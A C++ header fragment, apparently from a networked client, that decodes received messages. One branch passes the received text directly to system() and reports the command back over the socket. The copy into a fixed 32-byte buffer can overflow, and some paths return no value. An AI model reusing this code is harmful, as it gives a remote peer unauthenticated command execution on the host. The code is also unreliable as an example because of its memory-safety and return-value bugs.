#pragma once
int OutAnalyze(char *byte) {
	if (byte[0] == 88) {
		cout << "Client ";
		return -1;
	}
	else if (byte[0] == 3) {
		if (byte[1] == 1)cout << "Parameters Error" << endl;
		else if (byte[1] == 2)cout << "Function doesn't exist" << endl;
		else if (byte[1] == 5)cout << "Failed to call" << endl;
	}
	else if (byte[0] == (int)'p') {
		isAlive = 2000;
	}
	else if (byte[0] == 1) {
		cout << (byte + 2) << endl;
		system((byte + 2));
		char res[32]="[Order] ";
		for (int i = 0; i < min(32, strlen(byte + 2)); i++) {
			res[i + 8] = byte[i + 2];
		}
		send(sClient, (res), strlen(res), 0);
	}
	else {
		for (int i = 0; i < 31; i++) {
			cout << (int)byte[i] << " ";
		}
		cout << byte[15] << endl;
	}
}

int InAnalyze(char *input) {
	if (strcmp(input, "stop") == 0)return 0;
}